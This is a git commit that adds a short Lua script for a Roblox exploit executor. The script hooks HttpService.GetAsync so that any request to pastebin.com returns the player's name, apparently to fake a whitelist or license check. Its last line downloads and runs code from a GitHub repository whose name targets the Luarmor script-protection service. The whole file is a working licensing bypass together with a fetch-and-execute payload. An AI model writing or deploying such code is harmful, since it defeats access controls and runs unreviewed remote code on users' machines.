ead611cf4d79fec16f295ca8c42d591e98d79d83
Mc4121ban <105984396+Mc4121ban@users.noreply.github.com>
2024-10-13 22:50:18 +0700

    Create trust.lua

---
+++ trust.lua
@@ -0,0 +1,11 @@
+local HttpService = game:GetService("HttpService")
+local oldGetAsync
+oldGetAsync = hookfunction(HttpService.GetAsync, function(self, url)
+    if type(url) == "string" then
+        if string.match(url, "^https://pastebin%.com") then
+            return game.Players.LocalPlayer.Name
+        end
+    end
+    return oldGetAsync(self, url)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vxyo/FuckLuarmor/refs/heads/main/trust-lua-lol.lua"))()
